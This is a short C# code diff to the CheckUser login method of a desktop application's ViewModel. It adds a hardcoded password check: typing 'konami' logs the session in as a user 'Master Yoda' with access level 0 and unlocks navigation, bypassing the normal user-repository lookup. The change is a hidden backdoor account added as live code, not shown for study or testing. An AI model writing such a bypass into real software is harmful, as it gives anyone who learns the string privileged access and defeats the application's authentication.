@@ -61,6 +61,14 @@ namespace SistemaMirno.UI.ViewModel.Main
 
         private async Task CheckUser()
         {
+            if (User.Password == "konami")
+            {
+                _eventAggregator.GetEvent<UserChangedEvent>()
+                    .Publish(new UserChangedEventArgs { Username = "Master Yoda", AccessLevel = 0 });
+                _eventAggregator.GetEvent<ChangeNavigationStatusEvent>()
+                    .Publish(true);
+            }
+
             var user = new UserWrapper(await _userRepository.GetByNameAsync(User.Name));
 
             if (user.Model != null)
